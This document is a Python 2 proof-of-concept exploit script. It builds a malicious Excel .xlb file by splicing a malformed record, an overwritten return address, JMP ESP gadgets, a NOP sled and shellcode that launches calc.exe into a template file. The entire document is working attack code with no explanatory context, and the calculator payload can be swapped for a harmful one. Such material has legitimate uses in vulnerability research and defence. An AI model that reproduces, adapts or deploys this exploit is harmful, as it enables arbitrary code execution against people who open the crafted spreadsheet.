import sys

def main():
   
    try:
		fdR = open('src.xlb', 'rb+')
		strTotal = fdR.read()
		str1 = strTotal[:1556]
		str2 = strTotal[2385:]
		
		recordType = "\xA7\x00"
		recordLenght = "\x04\x00"
		field1 = "\xB0"
		field2 = "\x0F\x0C"
		field3 = "\x00"
		field4 = "\x3C\x00"
		field5 = "\x00\x03"
		
		record = recordType + recordLenght + field1 + field2 + field3 + field4 + field5
		
		eip = "\xDF\xD6\xD5\x3B"    # Call ESP
		
		# shellcode calc.exe
		shellcode = "A" * 68
		shellcode += "\x4f\x1b\x87\x30" # 30871B4F   FFE4             JMP ESP
		shellcode += "A" * (106 - len(shellcode))
		shellcode += "\xeb\x02" # jmp 4
		shellcode += "\x00\x60\x85\x30" # 30856000 write
		shellcode += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		shellcode += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
		shellcode += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
		shellcode += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
		shellcode += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
		shellcode += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
		shellcode += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
		shellcode += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
		shellcode += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
		shellcode += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
		shellcode += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
		shellcode += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
		shellcode += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
		shellcode += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
		shellcode += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
		shellcode += "\xff\xd5\x63\x61\x6c\x63\x00"

		if len(shellcode) > 800:
			print "[*] Error : Shellcode length is long"
			return
		if len(shellcode) <= 800:
			dif = 800 - len(shellcode)
			while dif > 0 :
				shellcode += '\x90'
				dif = dif - 1
				
		fdW= open('poc.xlb', 'wb+')
		fdW.write(str1)
		fdW.write(record)    
		fdW.write("\x41")     # pad
		fdW.write(eip)				
		fdW.write("\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
		fdW.write(shellcode)
		fdW.write(str2)
		
		fdW.close()
		fdR.close()
		print '[-] Excel file generated'
    except IOError:
        print '[*] Error : An IO error has occurred'
        print '[-] Exiting ...'
        sys.exit(-1)
                
if __name__ == '__main__':
    main()